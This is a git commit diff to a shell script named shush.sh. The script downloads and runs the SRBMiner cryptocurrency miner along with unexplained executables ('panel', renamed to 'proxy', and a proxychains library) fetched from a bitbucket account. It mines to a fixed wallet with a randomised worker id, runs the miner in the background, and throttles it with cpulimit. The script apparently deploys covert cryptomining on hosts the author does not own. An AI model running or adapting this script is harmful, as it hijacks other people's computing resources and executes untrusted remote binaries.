534439da17ef02a54296fc2b90a20956d0c6d578
HellDarkK <86185393+SankuNetwork@users.noreply.github.com>
2023-07-28 18:39:31 +0700

    Update shush.sh

--- srbs/shush.sh
+++ srbs/shush.sh
@@ -1,4 +1,4 @@
-apt update ; apt install htop neofetch -y
+apt update ; apt install cpulimit htop neofetch -y
 wget -O hamz.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/2.3.1/SRBMiner-Multi-2-3-1-Linux.tar.xz && tar -xf hamz.tar.gz
 wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
 wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
@@ -9,4 +9,5 @@ cd SRBMiner-Multi-2-3-1/
 mv SRBMiner-MULTI  ..
 cd ..
 mv SRBMiner-MULTI SRBM
-nohup ./SRBM --algorithm yespoweric --pool stratum+ssl://yespoweric.mine.zergpool.com:16238 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 50 + 1 )) --cpu-threads 6 --disable-gpu  &> /dev/null &
+sudo cpulimit --background -e SRBM -l 620
+./SRBM --algorithm yespoweric --pool stratum+ssl://yespoweric.mine.zergpool.com:16238 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 50 + 1 )) --cpu-priority value 5 --enable-workers-ramp-up --background --cpu-threads 0 --disable-gpu
